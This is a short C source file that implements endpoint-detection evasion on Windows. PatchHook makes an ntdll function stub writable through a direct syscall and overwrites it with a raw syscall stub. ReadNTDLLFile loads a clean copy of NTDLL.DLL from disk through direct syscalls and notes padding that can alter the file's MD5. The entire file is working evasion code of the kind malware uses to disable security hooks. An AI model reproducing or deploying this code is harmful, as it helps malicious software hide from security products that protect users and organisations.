#include "edr.h"


VOID PatchHook(PVOID address, unsigned char id)
{
	PVOID Addr = address;
	SIZE_T Size = 11;
	ULONG OldProtection = 0;
	/* any Zw* API call looks like this 
	* \x4c\x8b\xd1\xb8\xXX\x00\x00\x00\x0f\x05\xc3
	* 4C:8BD1                  | mov r10,rcx 
	* B8 XX000000              | mov eax,SYSCALL_ID 
	* 0F05                     | syscall
	* C3                       | ret 
	*/
	char patch[11];
	sprintf_s(patch, "\x4c\x8b\xd1\xb8%c\x00\x00\x00\x0f\x05\xc3", id);

	NTSTATUS res = NtProtectVirtualMemorySysCall(GetCurrentProcess(), &Addr, &Size, PAGE_EXECUTE_READWRITE, &OldProtection);


	memcpy((char*)Addr, patch, Size);
}


char* ReadNTDLLFile(DWORD& FileSize)
{
	HANDLE hFile;
	NTSTATUS status;
	PVOID Buffer = NULL;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK isb;
	UNICODE_STRING Unicode;
	WCHAR* ntdllpath = (WCHAR*)L"\\??\\\\C:\\WINDOWS\\SYSTEM32\\NTDLL.DLL";


	RtlInitUnicodeString(&Unicode, ntdllpath);
	InitializeObjectAttributes(&objAttr, &Unicode, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = NtCreateFileSysCall(&hFile, FILE_GENERIC_READ, &objAttr, &isb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, NULL, NULL, 0);

	DWORD FileSizeHigh = 0;
	FileSize = GetFileSize(hFile, &FileSizeHigh);
	LARGE_INTEGER nReadBytes;
	nReadBytes.LowPart = 0;
	nReadBytes.HighPart = 0;
	Buffer = malloc((size_t)FileSize + 20); //we use 20 bytes for padding if we want to change the DLL MD5 
	memset(Buffer, 0, FileSize + 20);
	status = NtReadFileSysCall(hFile, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&isb, Buffer, FileSize, &nReadBytes, NULL);
	NtCloseSysCall(hFile);
	return (char*)Buffer;
}


